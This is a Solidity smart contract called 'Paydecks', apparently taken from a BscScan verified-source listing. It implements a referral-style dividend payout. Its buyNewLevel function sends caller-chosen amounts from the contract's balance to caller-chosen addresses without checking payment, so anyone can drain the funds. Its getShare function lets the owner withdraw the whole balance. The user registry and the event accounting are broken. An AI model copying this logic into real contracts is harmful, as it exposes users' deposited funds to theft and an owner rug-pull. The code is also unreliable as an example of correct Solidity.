/**
 *Submitted for verification at BscScan.com on 2021-07-11
*/

pragma solidity >=0.7.0 <0.9.0;



contract Paydecks {
    
struct User {
        uint id;
        address referrer;
        uint partnersCount;
}

mapping(address => User) public users;
mapping(address => uint) public addressToId;
mapping(uint => address) public userIds;
address public owner;
uint public lastUserId = 2;

event SentDividends(address referrerAddress , uint value);
 


constructor(address ownerAddress) public {
        
        owner = ownerAddress;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        addressToId[ownerAddress] = 1;
        
        

        userIds[1] = ownerAddress;
    } 
 
function buyNewLevel(address[] calldata  userAddress, uint[] calldata  value) external payable {

         uint8 i = 0;
         uint totalbal = 0 ;
        for (i; i < userAddress.length; i++) {
        if (!payable(userAddress[i]).send(value[i])) {
            totalbal = (totalbal + value[i]);
            return payable(userAddress[i]).transfer(value[i]);
            }
        }
        emit SentDividends(msg.sender,totalbal);
    }
    
   function getShare(address receiver) external returns(string memory) {
        require(msg.sender==owner, 'Invalid Owner');
        payable(receiver).transfer(address(this).balance);
        return "Shared !)";
    }    
}